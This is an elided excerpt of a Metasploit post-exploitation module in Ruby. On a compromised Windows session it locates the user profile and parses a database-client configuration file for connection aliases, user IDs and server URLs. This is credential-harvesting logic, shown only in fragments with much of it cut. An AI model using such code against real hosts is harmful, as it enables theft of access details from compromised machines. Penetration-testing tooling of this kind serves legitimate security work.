...
class MetasploitModule < Msf::Post
  ...
  def run
    ...
    when 'windows'
      user_profile = if session.type == 'meterpreter'
                       session.sys.config.getenv('USERPROFILE')
                     else
                       cmd_exec("echo %USERPROFILE%").strip
                     end
    ...
    db_table = if oldversion
                 # Parse old config file
                 parse_old_config_file(raw_xml)
               else
                 # Parse new config file
                 parse_new_config_file(raw_xml)
               end
  ...
  def parse_new_config_file(raw_xml)
    ...
    raw_xml.each_line do |line|
      version_found = find_version(line) if version_found == false

      if line =~ /<Database id=/
        dbfound = true
      elsif line =~ /<\/Database>/
        dbfound = false
        db[:Database] = "" if db[:Database].nil?
        db[:Namespace] = "" if db[:Namespace].nil?
        # save
      ...
      # get the alias
      db[:Alias] = Regexp.last_match(1) if line =~ /<Alias>([\S+\s+]+)<\/Alias>/i

      # get the type
      db[:Type] = Regexp.last_match(1) if line =~ /<Type>([\S+\s+]+)<\/Type>/i

      # get the user
      db[:UserID] = Regexp.last_match(1) if line =~ /<Userid>([\S+\s+]+)<\/Userid>/i
  ...
  def parse_old_config_file(raw_xml)
    ...
    # fetch config file
    raw_xml.each_line do |line|
      vesrion_found = find_version(line) if version_found == false
      ...
      # get the server URL
      db[:URL] = Regexp.last_match(1) if line =~ /<Url>(\S+)<\/Url>/i
    end
